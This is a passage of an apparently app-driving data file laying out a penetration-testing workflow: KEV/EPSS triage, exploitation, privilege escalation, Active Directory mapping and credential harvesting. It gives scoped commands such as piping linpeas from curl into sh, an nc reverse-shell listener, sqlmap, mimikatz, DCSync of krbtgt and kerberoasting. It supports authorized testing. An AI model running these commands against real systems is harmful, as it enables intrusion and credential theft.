          { name: 'cvemap', url: 'https://github.com/projectdiscovery/cvemap', kind: 'cli', note: 'CVE search/filter from CLI' },
          { name: 'ADCS attack reference (SpecterOps)', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2', kind: 'web', note: 'The ESC1-ESC8 catalog — required reading for ADCS work', techApplies: ['kerberos', 'ldap'], osApplies: ['windows'] },
        ],
      },
      {
        title: 'Triage against KEV (Known Exploited Vulnerabilities)',
        description:
          "Cross-reference your CVE list with CISA's KEV catalog — vulns that are actively being exploited in the wild. KEV-listed CVEs jump to the top of the queue regardless of CVSS.",
        commands: [
          {
            label: 'KEV — apache matches',
            command: "mkdir -p engagements/{target}/vuln && curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq -r '.vulnerabilities[] | select(.product | test(\"apache\"; \"i\")) | \"\\(.cveID)\\t\\(.vendorProject) \\(.product)\\t\\(.shortDescription)\"' | tee engagements/{target}/vuln/kev-apache.txt",
            techApplies: ['apache'],
          },
          {
            label: 'KEV — nginx matches',
            command: "mkdir -p engagements/{target}/vuln && curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq -r '.vulnerabilities[] | select(.product | test(\"nginx\"; \"i\")) | \"\\(.cveID)\\t\\(.vendorProject) \\(.product)\\t\\(.shortDescription)\"' | tee engagements/{target}/vuln/kev-nginx.txt",
            techApplies: ['nginx'],
          },
          {
            label: 'KEV — IIS matches',
            command: "mkdir -p engagements/{target}/vuln && curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq -r '.vulnerabilities[] | select(.vendorProject | test(\"microsoft\"; \"i\")) | select(.product | test(\"iis\"; \"i\")) | \"\\(.cveID)\\t\\(.product)\\t\\(.shortDescription)\"' | tee engagements/{target}/vuln/kev-iis.txt",
            techApplies: ['iis'],
          },
          {
            label: 'KEV — wordpress matches',
            command: "mkdir -p engagements/{target}/vuln && curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq -r '.vulnerabilities[] | select(.product | test(\"wordpress\"; \"i\")) | \"\\(.cveID)\\t\\(.product)\\t\\(.shortDescription)\"' | tee engagements/{target}/vuln/kev-wordpress.txt",
            techApplies: ['wordpress'],
          },
          {
            label: 'KEV — generic (set product yourself)',
            command: "mkdir -p engagements/{target}/vuln && curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq -r '.vulnerabilities[] | select(.product | test(\"PRODUCT\"; \"i\")) | \"\\(.cveID)\\t\\(.vendorProject) \\(.product)\\t\\(.shortDescription)\"' | tee engagements/{target}/vuln/kev-matches.txt",
          },
          {
            label: 'KEV — full feed for grep / jq exploration',
            command: 'mkdir -p engagements/{target}/vuln && curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json -o engagements/{target}/vuln/kev-feed.json',
          },
        ],
        branches: [
          { if: 'KEV match found — validate immediately', goto: 'exploit' },
        ],
        tools: [
          { name: 'CISA KEV', url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog', kind: 'web' },
          { name: 'KEV JSON feed', url: 'https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json', kind: 'web', note: 'Machine-readable for scripting' },
        ],
      },
      {
        title: 'Score with EPSS for prioritization',
        description:
          'EPSS predicts the probability of exploitation in the next 30 days. Combine with KEV: EPSS > 0.5 OR on KEV → top priority. EPSS < 0.05 AND not on KEV → deprioritize unless impact is exceptional.',
        commands: [
          {
            label: 'EPSS API — single CVE (interpolates {cve})',
            command: "curl -s 'https://api.first.org/data/v1/epss?cve={cve}' | jq '.data[] | {cve, epss, percentile}'",
          },
          {
            label: 'EPSS API — bulk + save (interpolates {cves}, comma-sep)',
            command: "mkdir -p engagements/{target}/vuln && curl -s 'https://api.first.org/data/v1/epss?cve={cves}' | jq > engagements/{target}/vuln/epss.json",
          },
        ],
        tools: [
          { name: 'FIRST EPSS', url: 'https://www.first.org/epss/', kind: 'web' },
          { name: 'EPSS API', url: 'https://api.first.org/data/v1/epss', kind: 'web', note: 'Free, no auth' },
        ],
      },
      {
        title: 'Check exploit availability',
        description:
          'For prioritized CVEs, find public PoCs / exploit code. Vendor-published reproducers, Exploit-DB entries, and Metasploit modules are usually safer to validate than random GitHub PoCs (which sometimes contain malware).',
        commands: [
          {
            label: 'searchsploit — JSON output (interpolates {version})',
            command: 'searchsploit -j apache {version} | jq',
            techApplies: ['apache'],
          },
          {
            label: 'nuclei — list CVE templates by tag',
            command: 'mkdir -p engagements/{target}/vuln && nuclei -tl -tags cve | grep -i apache > engagements/{target}/vuln/nuclei-cve-templates.txt',
          },
          {
            label: 'searchsploit — mirror exploit locally (interpolates {exploit_id})',
            command: 'mkdir -p engagements/{target}/vuln/exploits && searchsploit -m {exploit_id} && mv {exploit_id}.* engagements/{target}/vuln/exploits/',
          },
        ],
        tools: [
          { name: 'Exploit-DB', url: 'https://www.exploit-db.com/', kind: 'web' },
          { name: 'Metasploit modules', url: 'https://www.rapid7.com/db/', kind: 'web' },
          { name: 'Nuclei templates', url: 'https://github.com/projectdiscovery/nuclei-templates', kind: 'cli', note: 'Pre-built detection templates per CVE' },
        ],
      },
      {
        title: 'Manual checks for OWASP top 10 patterns',
        description:
          'Scanners catch the obvious. The interesting bugs (broken auth, business-logic flaws, IDORs across user boundaries, race conditions, SSRF chains) need a human walking through the app with a proxy. This is the bread-and-butter work of bug-bounty and pentest web testing alike — usually the highest-value step in this phase.',
        branches: [
          { if: 'auth bypass or critical bug confirmed', goto: 'exploit' },
          { if: 'no manual finding, low-severity scope only', goto: 'defense' },
        ],
        tools: [
          { name: 'Burp Suite', url: 'https://portswigger.net/burp', kind: 'gui', note: 'Manual proxy use (Repeater, Intruder, Decoder) is universal across BB/private/lab' },
          { name: 'OWASP Web Security Testing Guide', url: 'https://owasp.org/www-project-web-security-testing-guide/', kind: 'web', note: 'The canonical per-category test checklist' },
          { name: 'PortSwigger Web Security Academy', url: 'https://portswigger.net/web-security', kind: 'web', note: 'Free, vendor-neutral technique training + labs' },
        ],
      },
      {
        title: 'Automated web vulnerability scanning',
        description:
          'Heavyweight active scanners — Burp Pro Active Scan, ZAP, Nessus — applied against the in-scope web surface. Almost all bug-bounty programs forbid these (they generate a flood of noise + false positives the program triages); some allow Nuclei specifically. For `private`, scan within RoE-defined windows. For `lab`, anything goes.',
        appliesTo: ['private', 'lab'],
        commands: [
          {
            label: 'nuclei — default templates',
            command: 'mkdir -p engagements/{target}/vuln && nuclei -u https://{target} -severity critical,high,medium -o engagements/{target}/vuln/nuclei.txt',
            mitreTechniques: ['T1595.002'],
          },
          {
            label: 'nuclei — exposed config + secrets',
            command: 'mkdir -p engagements/{target}/vuln && nuclei -u https://{target} -t exposures/ -o engagements/{target}/vuln/nuclei-exposures.txt',
            mitreTechniques: ['T1595.002', 'T1592.002'],
          },
          {
            label: 'nuclei — wordpress vuln scan',
            command: 'mkdir -p engagements/{target}/vuln && nuclei -u https://{target} -tags wordpress -o engagements/{target}/vuln/nuclei-wordpress.txt',
            techApplies: ['wordpress'],
          },
          {
            label: 'nuclei — apache-tagged templates',
            command: 'mkdir -p engagements/{target}/vuln && nuclei -u https://{target} -tags apache -o engagements/{target}/vuln/nuclei-apache.txt',
            techApplies: ['apache'],
          },
          {
            label: 'nuclei — nginx-tagged templates',
            command: 'mkdir -p engagements/{target}/vuln && nuclei -u https://{target} -tags nginx -o engagements/{target}/vuln/nuclei-nginx.txt',
            techApplies: ['nginx'],
          },
          {
            label: 'sqlmap — generic SQLi probe',
            command: "mkdir -p engagements/{target}/vuln && sqlmap -u 'https://{target}/path?id=1' --batch --level=3 --risk=2 --output-dir=engagements/{target}/vuln/sqlmap",
            mitreTechniques: ['T1595.003'],
          },
          {
            label: 'sqlmap — postgres-specific',
            command: "mkdir -p engagements/{target}/vuln && sqlmap -u 'https://{target}/path?id=1' --dbms=postgres --batch --level=3 --risk=2 --output-dir=engagements/{target}/vuln/sqlmap-pg",
            techApplies: ['postgres'],
          },
          {
            label: 'sqlmap — mysql-specific',
            command: "mkdir -p engagements/{target}/vuln && sqlmap -u 'https://{target}/path?id=1' --dbms=mysql --batch --level=3 --risk=2 --output-dir=engagements/{target}/vuln/sqlmap-mysql",
            techApplies: ['mysql'],
          },
          {
            label: 'sqlmap — mssql-specific',
            command: "mkdir -p engagements/{target}/vuln && sqlmap -u 'https://{target}/path?id=1' --dbms=mssql --batch --level=3 --risk=2 --output-dir=engagements/{target}/vuln/sqlmap-mssql",
            techApplies: ['mssql'],
          },
        ],
        branches: [
          { if: 'scanner confirms exploitable finding', goto: 'exploit' },
        ],
        tools: [
          { name: 'Nuclei', url: 'https://github.com/projectdiscovery/nuclei', kind: 'cli', note: 'Template-driven; the one BB programs sometimes allow' },
          { name: 'Burp Suite (active scan)', url: 'https://portswigger.net/burp', kind: 'gui', note: 'Pro feature — heavy and noisy' },
          { name: 'sqlmap', url: 'https://github.com/sqlmapproject/sqlmap', kind: 'cli', note: 'For confirmed-or-suspected SQL injection — narrow target, not blanket' },
        ],
      },
    ],
    output:
      "A prioritized vulnerability list: CVE / weakness, affected asset, exploit availability, KEV/EPSS scores, and a confidence note. The top of this list is what you'll attempt to validate in the exploitation phase.",
    tags: ['cve'],
  },

  /* ─────────────── Phase 3: Exploitation ─────────────── */
  {
    slug: 'exploit',
    index: 3,
    name: 'Exploitation',
    short: 'Exploit',
    blurb:
      'Land initial access using the prioritized vulns from phase 2. Repeatable, documented, and (for private engagements) cleanable.',
    goal:
      'Take a prioritized weakness and turn it into demonstrated initial access. The bar is not "I might be able to exploit this" — it is "I have a reproducible PoC, I have evidence, and I know exactly what I touched."',
    preChecks: [
      {
        appliesTo: ['bug-bounty'],
        text: "Confirm exploitation is permitted. Many bug bounty programs only allow reproduction-of-vuln (e.g. printing your own session ID via XSS), NOT actual exploitation against other users or production data. Stop at proof-of-impact, not actual impact.",
      },
      {
        appliesTo: ['private'],
        text: "Confirm allowed techniques in the RoE. Verify blackout windows. Confirm the emergency contact and abort plan — if you accidentally take down a production service, who do you call and what's the protocol?",
      },
      {
        appliesTo: ['private'],
        text: 'Have a rollback plan for any persistence you create. Don\u2019t drop persistence on production without explicit pre-clearance — and document everything per the cleanup-log discipline.',
      },
      {
        appliesTo: ['bug-bounty', 'private'],
        text: 'Set up traffic recording before you fire anything. Burp/Caido proxy logs, terminal session recording (script/asciinema), screenshots — you cannot reconstruct evidence after the fact.',
      },
      {
        appliesTo: ['bug-bounty', 'private'],
        text: 'Pick the highest-priority vuln from phase 2 with the lowest noise. Validation should be quiet; once you have access, you can be louder if scope allows.',
      },
      {
        appliesTo: ['lab'],
        text: 'Confirm your callback infrastructure works from inside the lab. Reverse shells / OOB exfiltration need a listener on your VPN-assigned IP, not on a public host the lab box cannot reach.',
      },
    ],
    steps: [
      {
        title: 'Set up the testing environment',
        description:
          "Spin up your scratch VM (or container) — a clean environment dedicated to this engagement. Configure your proxy, your recording tools, and your evidence directory. Verify your source IP matches what's in scope (VPN, allowlisted IP, etc).",
        commands: [
          {
            label: 'init engagement folder tree',
            command: 'mkdir -p engagements/{target}/{recon,vuln,exploit/sqlmap,post-ex/bloodhound,evidence/screenshots} && tree engagements/{target}',
          },
          {
            label: 'asciinema recording',
            command: 'mkdir -p engagements/{target}/exploit && asciinema rec engagements/{target}/exploit/session-$(date +%Y%m%d-%H%M).cast',
          },
        ],
        tools: [
          { name: 'Burp Suite', url: 'https://portswigger.net/burp', kind: 'gui', note: 'The de facto web-app proxy' },
          { name: 'mitmproxy', url: 'https://mitmproxy.org/', kind: 'cli', note: 'Scriptable, terminal-based proxy' },
          { name: 'asciinema', url: 'https://asciinema.org/', kind: 'cli', note: 'Record terminal sessions verbatim for evidence' },
        ],
      },
      {
        title: 'Acquire or develop the exploit',
        description:
          "Prefer vendor-published reproducers and vetted modules — random GitHub PoCs occasionally drop malware. The right tooling depends on the bug class: web-app exploitation (the dominant surface for bug-bounty) is mostly Burp Repeater + crafted payloads; network/system exploitation (more common in private/lab) leans on Metasploit modules and vendor PoCs. For novel issues, write your own; keep it minimal and obvious.",
        commands: [
          {
            label: 'searchsploit — find a PoC (interpolates {version})',
            command: 'searchsploit -t apache {version}',
            techApplies: ['apache'],
          },
          {
            label: 'mirror PoC into engagement folder (interpolates {exploit_id})',
            command: 'mkdir -p engagements/{target}/exploit/poc && searchsploit -m {exploit_id} && mv {exploit_id}.* engagements/{target}/exploit/poc/',
          },
          {
            label: 'msfconsole — load module without running',
            command: "msfconsole -q -x 'use exploit/multi/http/apache_normalize_path_rce; show options; exit'",
          },
        ],
        tools: [
          { name: 'Exploit-DB', url: 'https://www.exploit-db.com/', kind: 'web' },
          { name: 'Metasploit Framework', url: 'https://docs.rapid7.com/metasploit/', kind: 'cli', note: 'Network/system exploitation \u2014 less common in pure web/BB work' },
          { name: 'PortSwigger research', url: 'https://portswigger.net/research', kind: 'web', note: 'Canonical web-vuln techniques + recent disclosure analyses' },
        ],
      },
      {
        title: 'Land initial access',
        description:
          'Send the payload. Validate that you got what you expected — a session, a shell, a file read, an authenticated context. Stop and document the exact request/response. If access is intermittent or noisy, slow down before pushing further.',
        commands: [
          {
            label: 'sqlmap — narrow injection check',
            command: "mkdir -p engagements/{target}/exploit/sqlmap && sqlmap -u 'https://{target}/path?id=1' --batch --level=3 --risk=2 --output-dir=engagements/{target}/exploit/sqlmap",
            mitreTechniques: ['T1190'],
          },
          {
            label: 'nc — listener for reverse shells',
            command: 'mkdir -p engagements/{target}/exploit && nc -lvnp 4444 | tee -a engagements/{target}/exploit/listener-$(date +%Y%m%d-%H%M).log',
            mitreTechniques: ['T1071.001', 'T1059.004'],
          },
        ],
        branches: [
          { if: 'access landed', goto: 'post-ex' },
          { if: 'no usable foothold', goto: 'vuln' },
        ],
        tools: [
          { name: 'sqlmap', url: 'https://github.com/sqlmapproject/sqlmap', kind: 'cli', note: 'For SQLi → file read / RCE chains' },
          { name: 'PayloadsAllTheThings', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings', kind: 'web', note: 'Comprehensive injection / abuse payload corpus' },
          { name: 'ysoserial', url: 'https://github.com/frohoff/ysoserial', kind: 'cli', note: 'Java deserialization payloads', techApplies: ['java'] },
          { name: 'ysoserial.net', url: 'https://github.com/pwntester/ysoserial.net', kind: 'cli', note: '.NET deserialization payloads', techApplies: ['dotnet'] },
          { name: 'WPScan', url: 'https://github.com/wpscanteam/wpscan', kind: 'cli', note: 'WordPress vuln scanner (token recommended for plugin DB)', techApplies: ['wordpress'] },
        ],
      },
      {
        title: 'Capture evidence immediately',
        description:
          "Capture timestamps. For each finding: what was sent, what came back, what proves impact. This IS the report. Evidence shape varies by surface: web/BB findings live in proxy request/response pairs (Burp Repeater + a screenshot is typically enough); network/system findings rely on the asciinema/script recording you set up in step 1 so the command sequence and output are reconstructable.",
        commands: [
          {
            label: 'save curl request + response pair',
            command: "mkdir -p engagements/{target}/evidence && curl -v 'https://{target}/path' 2> engagements/{target}/evidence/req-$(date +%Y%m%d-%H%M).log",
          },
          {
            label: 'screenshot to evidence folder (linux/win)',
            command: 'mkdir -p engagements/{target}/evidence/screenshots && flameshot full -p engagements/{target}/evidence/screenshots/$(date +%Y%m%d-%H%M).png',
          },
        ],
        branches: [
          { if: 'evidence is enough for this engagement (BB-style proof)', goto: 'defense' },
        ],
        tools: [
          { name: 'Burp Repeater', url: 'https://portswigger.net/burp/documentation/desktop/tools/repeater', kind: 'gui', note: 'Re-issue the exact request that proved the bug \u2014 standard for web/BB evidence' },
          { name: 'Flameshot', url: 'https://flameshot.org/', kind: 'gui', note: 'Linux/Win annotated screenshots' },
        ],
      },
      {
        title: 'Validate the chain end-to-end',
        description:
          'Reproduce the exploit from scratch in a clean session. If you can\'t reproduce it without leftover artifacts (existing cookies, special tokens you set up earlier), it isn\'t a complete chain. Note prerequisites explicitly.',
        commands: [
          {
            label: 'snapshot your shell history for the run',
            command: 'mkdir -p engagements/{target}/exploit && HISTTIMEFORMAT="%F %T " history | tail -200 | tee engagements/{target}/exploit/cmd-history.txt',
          },
          {
            label: 'replay PoC in a fresh curl session (no cookies, no cache)',
            command: "curl -s --no-keepalive 'https://{target}/exploit-path' -o engagements/{target}/exploit/replay-$(date +%Y%m%d-%H%M).html",
          },
        ],
        branches: [
          { if: 'reproduces cleanly — go pursue impact', goto: 'post-ex' },
          { if: 'flaky or dependent on stale state — re-prioritize', goto: 'vuln' },
        ],
      },
    ],
    output:
      'For each successful exploit: a documented initial-access chain (prerequisites + steps + evidence + impact statement). For each failed attempt: a note on why (so you don\'t re-try it pointlessly later). The successful chains feed post-exploitation; the failures inform the report\'s "what we tried" section.',
    tags: ['exploit'],
    team: 'offense',
  },

  /* ─────────────── Phase 4: Post-exploitation ─────────────── */
  {
    slug: 'post-ex',
    index: 4,
    name: 'Post-exploitation',
    short: 'Post-ex',
    blurb:
      'Turn initial access into demonstrable impact within the engagement scope. Privilege escalation, credential harvesting, lateral movement — every artifact tracked for cleanup.',
    goal:
      'Demonstrate what an attacker could ACTUALLY do given initial access. The point is impact narrative ("we landed here, then got to crown-jewel-X"), not collection. Touch only what scope allows. Track every artifact you create.',
    preChecks: [
      {
        appliesTo: ['bug-bounty'],
        text: "Confirm post-exploitation is in scope. It usually is NOT — most programs stop at proof of vuln. If you got a shell and the program is reproduction-only, document and stop.",
      },
      {
        appliesTo: ['private'],
        text: 'Confirm authorization to escalate privileges, dump credentials, and move laterally. Each of those is a separate decision in most RoEs. Pivoting to out-of-scope hosts is a contract violation even on accident.',
      },
      {
        text: 'Open a "cleanup log" — a running file where you record every artifact you create (uploaded files, accounts created, services started, registry keys). You will need this to undo your changes at end-of-engagement.',
      },
      {
        appliesTo: ['private', 'lab'],
        text: 'Snapshot the system state if you can — VM snapshot, file-mtime baseline, etc. Makes rollback simpler and proves what you did vs didn\'t touch.',
      },
    ],
    steps: [
      {
        title: 'Local enumeration / situational awareness',
        description:
          "Figure out where you are: hostname, OS, current user/privileges, network position, what services run on this host, what's in the user's home directory. **Engagement matters here.** For `lab`: drop linpeas/winpeas, grab the report, move on. For `private`: PEAS scripts drop a multi-MB binary, hit hundreds of files/registry keys, and trigger every EDR signature in the catalog \u2014 use the references below as **lookups**, not as scripts to run. Hand-craft enumeration commands using LOLBAS/GTFOBins as a checklist of what to look for. Living off the land = built-in commands, no dropped binaries when avoidable.",
        commands: [
          {
            label: 'linux — manual triage (quiet)',
            command: '(id; uname -a; hostname; ip a; ss -tulpn; ls -la /etc/cron* /var/spool/cron/ 2>/dev/null; sudo -nl 2>/dev/null) | tee /tmp/triage-{target}.txt',
            appliesTo: ['private', 'lab'],
            osApplies: ['linux'],
          },
          {
            label: 'linux — linpeas (lab; drops binary, AV bait)',
            command: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh -s -- -a > /tmp/linpeas-{target}.txt',
            appliesTo: ['lab'],
            osApplies: ['linux'],
          },
          {
            label: 'windows — manual triage (quiet)',
            command: '(whoami /all & systeminfo & ipconfig /all & netstat -ano & tasklist /svc & schtasks /query /fo LIST /v) > %TEMP%\\triage-{target}.txt',
            appliesTo: ['private', 'lab'],
            osApplies: ['windows'],
          },
          {
            label: 'windows — winpeas (lab; drops binary, AV bait)',
            command: 'iwr -Uri https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile $env:TEMP\\winpeas.exe; & $env:TEMP\\winpeas.exe > $env:TEMP\\winpeas-{target}.txt',
            appliesTo: ['lab'],
            osApplies: ['windows'],
          },
          {
            label: 'pull output back to engagement folder (linux)',
            command: 'mkdir -p engagements/{target}/post-ex && scp user@{target}:/tmp/triage-{target}.txt engagements/{target}/post-ex/',
            osApplies: ['linux'],
          },
          {
            label: 'pull output back via SMB share (windows)',
            command: 'mkdir -p engagements/{target}/post-ex && smbclient //{target}/C$ -U user%pass -c "get Users\\user\\AppData\\Local\\Temp\\triage-{target}.txt engagements/{target}/post-ex/triage.txt"',
            osApplies: ['windows'],
          },
          /* Cloud-context post-ex enumeration — fires when you have
             cloud SDK creds (env vars, instance role, kube
             kubeconfig) and need to know what the principal can
             actually do. Identity-first; volume / cost / API
             enumeration follows naturally from the principal scope. */
          {
            label: 'aws — current identity + adjacent enum (sts + s3 + ec2)',
            command: 'mkdir -p engagements/{target}/post-ex && (aws sts get-caller-identity; aws s3 ls; aws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,State.Name,PrivateIpAddress]") | tee engagements/{target}/post-ex/aws-enum.txt',
            techApplies: ['aws'],
          },
          {
            label: 'gcp — current principal + project enum',
            command: 'mkdir -p engagements/{target}/post-ex && (gcloud auth list; gcloud projects list; gcloud compute instances list) | tee engagements/{target}/post-ex/gcp-enum.txt',
            techApplies: ['gcp'],
          },
          {
            label: 'azure — current account + resource enum',
            command: 'mkdir -p engagements/{target}/post-ex && (az account show; az resource list --query "[].{name:name, type:type, location:location}" -o table) | tee engagements/{target}/post-ex/azure-enum.txt',
            techApplies: ['azure'],
          },
          {
            label: 'k8s — pod + secret enumeration with current kubeconfig',
            command: 'mkdir -p engagements/{target}/post-ex && (kubectl auth can-i --list; kubectl get pods -A; kubectl get secrets -A 2>&1 | head -50) | tee engagements/{target}/post-ex/k8s-enum.txt',
            techApplies: ['k8s'],
          },
        ],
        tools: [
          { name: 'GTFOBins', url: 'https://gtfobins.github.io/', kind: 'web', note: 'Linux SUID/sudo/restricted-shell-escape reference — query before running', osApplies: ['linux'] },
          { name: 'LOLBAS', url: 'https://lolbas-project.github.io/', kind: 'web', note: 'Windows abusable-binary reference for building manual enum commands', osApplies: ['windows'] },
          { name: 'linpeas', url: 'https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS', kind: 'cli', note: 'Lab-default Linux enumeration script (loud on monitored hosts)', osApplies: ['linux'] },
          { name: 'winpeas', url: 'https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS', kind: 'cli', note: 'Lab-default Windows enumeration script (same loudness caveat)', osApplies: ['windows'] },
          { name: 'pacu', url: 'https://github.com/RhinoSecurityLabs/pacu', kind: 'cli', note: 'AWS exploitation framework — privesc paths, persistence, enum modules', techApplies: ['aws'] },
          { name: 'prowler', url: 'https://github.com/prowler-cloud/prowler', kind: 'cli', note: 'Multi-cloud audit (AWS / GCP / Azure / K8s) — CIS + custom checks', techApplies: ['aws', 'gcp', 'azure', 'k8s'] },
          { name: 'ScoutSuite', url: 'https://github.com/nccgroup/ScoutSuite', kind: 'cli', note: 'Multi-cloud security audit — auth, then HTML report of misconfigs', techApplies: ['aws', 'gcp', 'azure'] },
          { name: 'kubectl-who-can', url: 'https://github.com/aquasecurity/kubectl-who-can', kind: 'cli', note: 'Reverse RBAC lookup — "who can do X to Y?"', techApplies: ['k8s'] },
        ],
      },
      {
        title: 'Privilege escalation',
        description:
          "Move from your initial low-privilege access to root/SYSTEM where possible. Local kernel exploits, misconfigured sudo, service misconfigurations, scheduled tasks owned by privileged users — many paths.",
        commands: [
          {
            label: 'linux — list NOPASSWD sudo entries',
            command: 'sudo -nl 2>/dev/null | tee /tmp/sudo-{target}.txt',
            osApplies: ['linux'],
            mitreTechniques: ['T1548.003'],
          },
          {
            label: 'linux — find SUID binaries (cross-ref GTFOBins)',
            command: 'find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid-{target}.txt',
            osApplies: ['linux'],
            mitreTechniques: ['T1548.001'],
          },
          {
            label: 'linux — pspy (watch for cron / scheduled-task races)',
            command: 'curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -i 1000',
            osApplies: ['linux'],
            mitreTechniques: ['T1057', 'T1053.003'],
          },
          {
            label: 'windows — current-user privileges + tokens',
            command: 'whoami /priv & whoami /groups',
            osApplies: ['windows'],
            mitreTechniques: ['T1033', 'T1069.001'],
          },
          {
            label: 'windows — services with insecure permissions',
            command: 'PowerShell -ExecutionPolicy Bypass -Command "Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq \'Auto\' -and $_.PathName -notlike \'*\\\"*\'} | Select Name, PathName, StartName"',
            osApplies: ['windows'],
            mitreTechniques: ['T1574.011'],
          },
          {
            label: 'windows — unquoted service paths (classic privesc)',
            command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
            osApplies: ['windows'],
            mitreTechniques: ['T1574.009'],
          },
        ],
        branches: [
          { if: 'root/SYSTEM achieved', goto: 'post-ex' },
        ],
        tools: [
          { name: 'GTFOBins', url: 'https://gtfobins.github.io/', kind: 'web', note: 'Sudo / SUID abuse reference', osApplies: ['linux'] },
          { name: 'LOLBAS', url: 'https://lolbas-project.github.io/', kind: 'web', note: 'Windows binaries with abusable functionality', osApplies: ['windows'] },
          { name: 'PrivescCheck', url: 'https://github.com/itm4n/PrivescCheck', kind: 'cli', note: 'Windows-focused privesc enumeration', osApplies: ['windows'] },
          { name: 'pspy', url: 'https://github.com/DominicBreuker/pspy', kind: 'cli', note: 'See processes you don\u2019t own — find scheduled-task races', osApplies: ['linux'] },
        ],
      },
      {
        title: 'Active Directory mapping (if applicable)',
        description:
          "On internal Windows networks, map the AD environment: users, groups, ACLs, trust relationships, kerberoastable accounts, AS-REP-roastable accounts, paths to Domain Admin.",
        appliesTo: ['private', 'lab'],
        osApplies: ['windows'],
        commands: [
          {
            label: 'bloodhound-python collector',
            command: "mkdir -p engagements/{target}/post-ex/bloodhound && (cd engagements/{target}/post-ex/bloodhound && bloodhound-python -u 'user' -p 'pass' -d {target} -ns {target} -c All --zip)",
            techApplies: ['ldap', 'kerberos'],
            mitreTechniques: ['T1087.002', 'T1069.002', 'T1018'],
          },
          {
            label: 'netexec — quick auth + enum',
            command: 'mkdir -p engagements/{target}/post-ex && netexec smb {target} -u user -p pass --shares --users --groups | tee engagements/{target}/post-ex/netexec-smb.txt',
            techApplies: ['ldap'],
            mitreTechniques: ['T1135', 'T1087.002'],
          },
          {
            label: 'certipy — find ADCS misconfigurations (ESC1-ESC8)',
            command: 'mkdir -p engagements/{target}/post-ex && certipy find -u user@DOMAIN -p pass -dc-ip {target} -vulnerable -stdout | tee engagements/{target}/post-ex/certipy-find.txt',
            techApplies: ['kerberos', 'ldap'],
            mitreTechniques: ['T1649'],
          },
          {
            label: 'GetUserSPNs — list kerberoastable accounts (no roast yet)',
            command: 'mkdir -p engagements/{target}/post-ex && impacket-GetUserSPNs DOMAIN/user:pass -dc-ip {target} | tee engagements/{target}/post-ex/spns.txt',
            techApplies: ['kerberos'],
            mitreTechniques: ['T1558.003'],
          },
        ],
        branches: [
          { if: 'path to Domain Admin found', goto: 'post-ex' },
          { if: 'ESC1 / ESC4 / ESC8 found in certipy output', goto: 'post-ex' },
        ],
        tools: [
          { name: 'BloodHound CE', url: 'https://github.com/SpecterOps/BloodHound', kind: 'gui', note: 'AD attack-path graph (Community Edition)' },
          { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec', kind: 'cli', note: 'Successor to CrackMapExec — auth + enum across SMB/LDAP/etc.' },
          { name: 'Impacket', url: 'https://github.com/fortra/impacket', kind: 'cli', note: 'AD protocol toolkit (secretsdump, GetUserSPNs, GetNPUsers)' },
          { name: 'Certipy', url: 'https://github.com/ly4k/Certipy', kind: 'cli', note: 'ADCS attack toolkit — finds and exploits ESC1-ESC8', techApplies: ['kerberos', 'ldap'] },
        ],
      },
      {
        title: 'Credential harvesting',
        description:
          "Pull credentials from memory, keystores, browser data, configuration files. Cracked or cleartext, they enable lateral movement. **Mimikatz reality check**: the unmodified binary triggers AV/EDR signatures from a mile away. Lab/training: fine, run it. Private with active EDR: prefer alternatives \u2014 Rubeus for Kerberos, in-memory loaders, dpapi-extraction over secretsdump.py, or live-off-the-land Windows commands. Treat all dumped material as sensitive per RoE.",
        appliesTo: ['private', 'lab'],
        osApplies: ['windows'],
        commands: [
          {
            label: 'mimikatz (lab — drops binary, AV bait)',
            command: 'mkdir -p engagements/{target}/post-ex && mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > engagements/{target}/post-ex/mimikatz.txt',
            appliesTo: ['lab'],
          },
          {
            label: 'impacket secretsdump (remote, quieter)',
            command: "mkdir -p engagements/{target}/post-ex && impacket-secretsdump 'DOMAIN/user:pass@{target}' -outputfile engagements/{target}/post-ex/secretsdump",
            mitreTechniques: ['T1003.002', 'T1003.003'],
          },
          {
            label: 'secretsdump — DCSync for a specific user (quieter than full dump)',
            command: "mkdir -p engagements/{target}/post-ex && impacket-secretsdump 'DOMAIN/user:pass@{target}' -just-dc-user 'krbtgt' -outputfile engagements/{target}/post-ex/dcsync-krbtgt",
            techApplies: ['kerberos'],
            mitreTechniques: ['T1003.006'],
          },
          {
            label: 'kerberoast — request TGS for SPN-bearing accounts',
            command: 'mkdir -p engagements/{target}/post-ex && impacket-GetUserSPNs -request -dc-ip {target} DOMAIN/user:pass -outputfile engagements/{target}/post-ex/kerberoast.txt',
            techApplies: ['kerberos'],
            mitreTechniques: ['T1558.003'],
          },
          {
            label: 'AS-REP roast — accounts with kerberos pre-auth disabled',
            command: 'mkdir -p engagements/{target}/post-ex && impacket-GetNPUsers DOMAIN/ -dc-ip {target} -usersfile users.txt -format hashcat -outputfile engagements/{target}/post-ex/asrep.txt',
            techApplies: ['kerberos'],
            mitreTechniques: ['T1558.004'],
          },
          {
            label: 'Rubeus — in-memory kerberoast (lab; .NET binary, AV bait)',
            command: 'Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap',
            appliesTo: ['lab'],
            techApplies: ['kerberos'],
            mitreTechniques: ['T1558.003'],
          },
          {
